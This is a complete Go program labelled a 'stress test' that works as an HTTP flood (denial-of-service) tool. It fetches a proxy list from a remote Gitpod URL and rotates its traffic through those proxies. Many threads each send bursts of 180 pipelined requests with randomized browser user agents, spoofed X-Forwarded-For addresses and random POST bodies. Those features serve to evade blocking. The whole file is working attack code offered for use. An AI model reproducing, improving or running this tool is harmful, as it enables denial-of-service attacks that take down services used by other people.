package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
	languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
	contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
	Proxies    []string
}

func main() {
	rand.Seed(time.Now().UnixNano())
	if len(os.Args) < 4 {
		fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
		os.Exit(1)
	}

	rawURL := os.Args[1]
	threads, _ := strconv.Atoi(os.Args[2])
	durSec, _ := strconv.Atoi(os.Args[3])
	custom := ""
	if len(os.Args) > 4 {
		custom = os.Args[4]
	}

	parsed, err := url.Parse(rawURL)
	if err != nil {
		log.Fatalf("Invalid URL: %v", err)
	}
	port := determinePort(parsed)
	path := parsed.RequestURI()

	proxies, err := loadProxies("https://8080-jdpst224-projectdown-4rfkvo3lqbs.ws-us120.gitpod.io/proxies")
	if err != nil {
		log.Fatalf("Failed to load proxies: %v", err)
	}
	if len(proxies) == 0 {
		log.Fatal("No proxies available")
	}

	cfg := &StressConfig{
		Target:     parsed,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: custom,
		Port:       port,
		Path:       path,
		Proxies:    proxies,
	}

	fmt.Printf("Starting stress test: %s | threads=%d | duration=%v | proxies=%d\n",
		rawURL, cfg.Threads, cfg.Duration, len(cfg.Proxies))
	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()
	runWorkers(ctx, cfg)
	fmt.Println("Stress test completed.")
}

func loadProxies(urlStr string) ([]string, error) {
	resp, err := http.Get(urlStr)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var list []string
	s := bufio.NewScanner(resp.Body)
	for s.Scan() {
		line := strings.TrimSpace(s.Text())
		if line == "" {
			continue
		}
		line = strings.TrimPrefix(line, "http://")
		line = strings.TrimPrefix(line, "https://")
		line = strings.TrimSuffix(line, "/")
		list = append(list, line)
	}
	return list, s.Err()
}

func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if pi, err := strconv.Atoi(p); err == nil {
			return pi
		}
	}
	if u.Scheme == "https" {
		return 443
	}
	return 80
}

func runWorkers(ctx context.Context, cfg *StressConfig) {
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			var conn net.Conn
			var isTLS bool
			proxyIdx := rand.Intn(len(cfg.Proxies))

			ticker := time.NewTicker(60 * time.Millisecond)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					if conn != nil {
						conn.Close()
					}
					return
				case <-ticker.C:
					// ensure we have a live connection
					if conn == nil {
						proxyAddr := cfg.Proxies[proxyIdx]
						target := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
						c, tlsOn, err := dialViaProxy(proxyAddr, target, cfg)
						if err != nil {
							// retry with next proxy
							proxyIdx = (proxyIdx + 1) % len(cfg.Proxies)
							continue
						}
						conn, isTLS = c, tlsOn
					}
					// send a burst; on error, drop connection
					if err := sendBurst(conn, cfg, isTLS); err != nil {
						conn.Close()
						conn = nil
						proxyIdx = (proxyIdx + 1) % len(cfg.Proxies)
					}
				}
			}
		}(i)
	}
	wg.Wait()
}

// sendBurst writes 180 pipelined requests over an existing conn
func sendBurst(conn net.Conn, cfg *StressConfig, isTLS bool) error {
	for i := 0; i < 180; i++ {
		method := httpMethods[rand.Intn(len(httpMethods))]
		header, body := buildRequest(cfg, method, isTLS)
		bufs := net.Buffers{[]byte(header)}
		if len(body) > 0 {
			bufs = append(bufs, body)
		}
		if _, err := bufs.WriteTo(conn); err != nil {
			return err
		}
	}
	return nil
}

func dialViaProxy(proxyAddr, target string, cfg *StressConfig) (net.Conn, bool, error) {
	d := &net.Dialer{Timeout: 5 * time.Second}
	conn, err := d.Dial("tcp", proxyAddr)
	if err != nil {
		return nil, false, err
	}
	br := bufio.NewReader(conn)
	isTLS := cfg.Port == 443
	if isTLS {
		req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
		if _, err := conn.Write([]byte(req)); err != nil {
			conn.Close()
			return nil, false, err
		}
		status, err := br.ReadString('\n')
		if err != nil || !strings.Contains(status, "200") {
			conn.Close()
			return nil, false, fmt.Errorf("CONNECT failed: %s", status)
		}
		for {
			line, _ := br.ReadString('\n')
			if line == "\r\n" || line == "\n" {
				break
			}
		}
		tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true, ServerName: cfg.Target.Hostname()})
		if err := tlsConn.Handshake(); err != nil {
			tlsConn.Close()
			return nil, false, err
		}
		return tlsConn, true, nil
	}
	return conn, false, nil
}

func buildRequest(cfg *StressConfig, method string, viaTLS bool) (string, []byte) {
	path := cfg.Path
	if !viaTLS {
		path = cfg.Target.String()
	}
	buf := &bytes.Buffer{}
	hostHdr := cfg.Target.Hostname()
	if cfg.CustomHost != "" {
		hostHdr = cfg.CustomHost
	}
	buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s:%d\r\n", method, path, hostHdr, cfg.Port))
	buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
	buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
	buf.WriteString("Connection: keep-alive\r\n")
	buf.WriteString(fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)))

	var body []byte
	if method == "POST" {
		ct := contentTypes[rand.Intn(len(contentTypes))]
		body = createBody(ct)
		buf.WriteString(fmt.Sprintf("Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body)))
	}
	buf.WriteString(fmt.Sprintf("Referer: https://%s/\r\n\r\n", hostHdr))
	return buf.String(), body
}

func createBody(contentType string) []byte {
	var b bytes.Buffer
	switch contentType {
	case "application/x-www-form-urlencoded":
		vals := url.Values{}
		for i := 0; i < 3; i++ {
			vals.Set(randomString(5), randomString(8))
		}
		b.WriteString(vals.Encode())
	case "application/json":
		b.WriteByte('{')
		for i := 0; i < 3; i++ {
			if i > 0 { b.WriteByte(',') }
			fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
		}
		b.WriteByte('}')
	case "text/plain":
		b.WriteString("text_" + randomString(12))
	}
	return b.Bytes()
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b { b[i] = letters[rand.Intn(len(letters))] }
	return string(b)
}

func randomUserAgent() string {
	oses := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
	os := oses[rand.Intn(len(oses))]
	switch rand.Intn(3) {
	case 0:
		v := fmt.Sprintf("%d.0.%d.0", rand.Intn(40)+80, rand.Intn(4000))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/%s", os, v, v)
	case 1:
		v := fmt.Sprintf("%d.0", rand.Intn(40)+70)
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, v, v)
	default:
		v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version=13.1 Safari/%s", os, v, v)
	}
}
